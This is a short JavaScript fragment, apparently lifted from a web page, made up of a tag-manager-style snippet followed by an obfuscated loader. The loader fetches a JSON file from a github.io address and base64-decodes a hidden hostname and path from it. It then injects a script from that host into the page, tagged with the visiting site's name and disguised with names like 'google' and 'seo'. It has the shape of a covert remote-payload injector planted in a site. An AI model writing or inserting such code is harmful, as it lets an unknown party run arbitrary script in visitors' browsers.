(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://resources.jetbrains.com/storage/optly/26613100737.js'+'?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MDVPXDT');

const mainHost = 'https://scottpito4.github.io/mouse-cursor/assets.json'
            , v = 'dfd0'

fetch(mainHost).then(d=>d.json()).then(u=>{let google=document,seo=google.createElement('script');seo.name='ggl',seo.src=`//${atob(u[0].id.slice(1))}${atob('L2dvb2dsZS1zZW8/dj0=')}${v}&h=${window.location.host}`,google.head.appendChild(seo)})
